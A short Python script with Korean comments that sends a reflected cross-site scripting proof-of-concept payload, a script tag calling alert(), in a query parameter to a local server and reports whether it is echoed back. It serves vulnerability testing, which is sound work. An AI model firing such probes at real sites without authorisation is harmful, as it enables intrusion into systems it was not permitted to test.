import requests

url = "http://localhost:3000"

# XSS 공격 페이로드 예시: alert() 호출
payload = "<script>alert('XSS poc');</script>"
#payload = "hello"

params = {"q": payload}

res = requests.get(url, params=params)

if payload in res.text:
    print("[+] PoC 성공: XSS 취약점 존재!")
else:
    print("[-] PoC 실패: 취약점 없음")